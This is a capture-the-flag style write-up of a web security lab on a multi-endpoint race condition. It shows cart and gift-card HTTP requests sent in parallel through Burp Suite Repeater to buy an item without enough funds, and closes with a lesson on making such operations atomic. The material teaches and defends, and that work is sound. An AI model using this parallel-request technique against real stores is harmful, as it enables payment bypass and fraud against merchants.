# Multi-endpoint race conditions

## Lab Description

This lab demonstrates a race condition involving multiple endpoints that perform operations on the same underlying data.

The application contains gift card and cart functionality that can be abused by sending requests concurrently. This can cause the application state to become inconsistent and allow the Leather Jacket to be purchased despite having insufficient funds.

## Lab Analysis

The application provides gift card functionality that can be accessed through the cart.

When attempting to purchase the Leather Jacket normally, the application reports that there are insufficient funds.

![Jacket giving insufficient funds](jacket-giving-insufficient-funds.png)

The relevant checkout request is:

```http
POST /cart/checkout HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<csrf-token>
```

The server responds with:

```http
HTTP/2 302 Found
Location: /cart?err=INSUFFICIENT_FUNDS
```

This confirms that the account does not normally have enough funds to complete the purchase.

## Identifying the Race Condition

The lab involves multiple endpoints that interact with the same cart and account state.

The requests were captured using Burp Suite and sent to Repeater. By placing the relevant requests into a Repeater group, they can be executed concurrently.

![Gift card functionality could introduce race conditions](gift-card-functionality-could-introduce-race-conditions.png)

The objective is to identify a race window where multiple requests can affect the same state before the application has completed all of its checks and updates.

## Capturing the Race Window

The relevant requests were added to a Burp Suite Repeater group.

Burp Suite provides the following option to execute the requests concurrently:

```text
Send group (parallel)
```

Sending the requests in parallel is important because sending them sequentially may not reproduce the race condition.

![Race window detected](race-window-detected.png)

The race window occurs when the application processes multiple operations on the same underlying state at approximately the same time.

## Exploiting the Race Condition

The cart request contains parameters similar to:

```http
POST /cart HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=-1&redir=CART
```

Another cart request can contain:

```http
POST /cart HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1&redir=PRODUCT
```

The gift card request contains the CSRF token and gift card code:

```http
POST /gift-card HTTP/2
Content-Type: application/x-www-form-urlencoded

csrf=<csrf-token>&gift-card=<gift-card-code>
```

The relevant requests are placed into the same Repeater group and executed using:

```text
Send group (parallel)
```

![Need to capture race window](need-to-capture-race-window.png)

Executing the requests concurrently allows them to reach the server within the same race window.

![Exploiting race conditions](exploting-race-conditions.png)

## Burp Suite Configuration

The requests were configured in Burp Suite Repeater and placed into the same group.

The important configuration is:

```text
Group
 ├── Request 1
 ├── Request 2
 └── Request 3

Send group (parallel)
```

The requests must be executed concurrently rather than one after another.

## Key Concept

The vulnerability exists because the application performs related operations across multiple endpoints without making the complete sequence atomic.

A simplified representation is:

```text
Request A
    |
    |-- Check current state
    |
Request B
    |
    |-- Modify the same state
    |
Request A
    |
    |-- Continue using the previous state
```

Under normal sequential execution, the application can maintain a consistent state.

However, when multiple requests are processed concurrently, two requests may observe or modify the same state before the other operation has completed.

This can result in unexpected application behavior.

## Impact

Race conditions can be particularly dangerous in functionality involving:

- Account balances
- Gift cards
- Shopping carts
- Discounts
- Coupon redemption
- Transfers
- Inventory
- Payment processing

If the application does not properly synchronize these operations, an attacker may be able to manipulate the application's state and bypass intended business logic.

## Conclusion

This lab demonstrates how a race condition can occur when multiple endpoints interact with the same underlying application state.

The main lessons are:

- Race conditions can involve multiple endpoints.
- Concurrent requests can produce states that are impossible during normal sequential execution.
- Burp Suite Repeater can be used to test race conditions.
- The **Send group (parallel)** feature is useful for identifying race windows.
- Sensitive operations such as payments, gift cards, and account balance changes should be implemented atomically.
